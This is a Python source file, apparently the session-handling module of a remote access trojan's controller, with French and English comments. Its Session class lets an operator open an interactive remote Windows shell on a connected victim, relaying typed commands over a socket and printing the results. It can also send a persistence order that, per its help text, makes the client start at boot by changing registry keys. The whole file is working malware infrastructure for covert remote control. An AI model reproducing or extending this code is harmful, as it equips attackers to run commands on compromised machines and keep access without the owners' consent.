#from colorama import Fore,Style

#from . import menu
#from  .other import recvall
#from .other import printColor
#from .management import CheckConn
#from .handler import Handler

from colorama import Fore,Style

from .other import recvall
from .other import printColor
from .other import recvsafe
from .management import CheckConn
from .handler import Handler
from .sql import Sql
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN, SPLIT

class Session:
    #This class is called when the target is selected.
   # sesssion = True
    def __init__(self,socket,ip_client,port_client,session_nb):
        self.socket = socket
        self.ip_client = ip_client
        self.port_client = port_client 
        self.session_nb = session_nb
       
    def help(self):
        printColor("help","""
-h or --help : Displays all session mode commands.

-s or --shell : Start a shell on the remote machine.

-b or --back : Back to menu.

-p or --persistence : Makes the client persistent at startup by changing the registry keys.
""") 
    def spawnShell(self):
        #Ouvre un shell sur la machine distante.
        #Envoie une message au client pour lui dire de se mettre en mode shell.
        #result_command = ""
        printColor("help","\n\n[?] Execute -b or --back to return to sessions mode.") 
        printColor("help","\r[?] Mod shell active, You can run windows commands.\n\n")
        while Handler.dict_conn[self.session_nb][NB_ALIVE]:
            shell = str(input("Shell>"))
            if shell:
                if(shell == "-b" or shell=="--back"):
                    #printColor("information","\n[-] Back to session mod.\n")
                    break
                else:
                    # self.socket.send(shell.encode())
                    print(self.session_nb)
                    if(CheckConn().safeSend(self.session_nb, self.socket,shell.encode())):
                        print(recvall(self.socket,4096).decode("utf-8","replace"))
                    else:
                        printColor("error","\n[-] An error occurred while sending the command.\n")
                        break
            else:
                pass

    def lonelyPersistence(self):
        #if Handler.dict_conn[self.session_nb][NB_ALIVE]:  #test is life
        mod_persi = "MOD_LONELY_PERSISTENCE:default"
        if(CheckConn().safeSend(self.session_nb, self.socket, mod_persi.encode())): #send mod persi
            printColor("information","[+] the persistence mod was sent.\n")
            
            reponse = recvsafe(self.socket,4096).decode("utf-8","replace")

            if(reponse == "\r\n"):#Mod persi ok  
                printColor("successfully","[+] the persistence mod is well executed with success..\n")
            else:
                printColor("error","[-] the persistence mod could not be executed on the client.")

        else:
            printColor("information","[+] the persistence mod was not sent.\n")


    def printInformation(self):
        pass


    def main(self): #Main function of the class | tpl = tuple session_nb = session number
        
        printColor("help","\n[?] Run -h or --help to list the available commands.\n")
        #while Handler.dict_conn[self.session_nb][3]: #If connexion is always connected (True)
        checker = True
        while Handler.dict_conn[self.session_nb][NB_ALIVE] and checker: #If connexion is always connected (True)
            terminal = str(input("Session:"+ str(self.session_nb)+">")).split()
            for i in range(0,len(terminal)):
                if terminal[i] == "-h" or terminal[i] == "--help":
                    self.help()
                elif terminal[i] == "-s" or terminal[i] == "--shell":
                    self.spawnShell()
                elif terminal[i] == "-b" or terminal[i] == "--back":
                    printColor("information","[-] Session stop.\n")
                    checker = False
                elif terminal[i] == "-p" or terminal[i] == "--persistence":
                    self.lonelyPersistence()
                else:
                    pass
            
        printColor("information","[-] The session was cut, back to menu.") #If the session close.
        printColor("information","[-] Back to the server menu.\n")

        #for key in Handler.dict_conn.keys():
            #print("Session ",key," ",Handler.dict_conn[key][1]+":"+str(Handler.dict_conn[key][2]))
        #print("\n")
#0.5 mo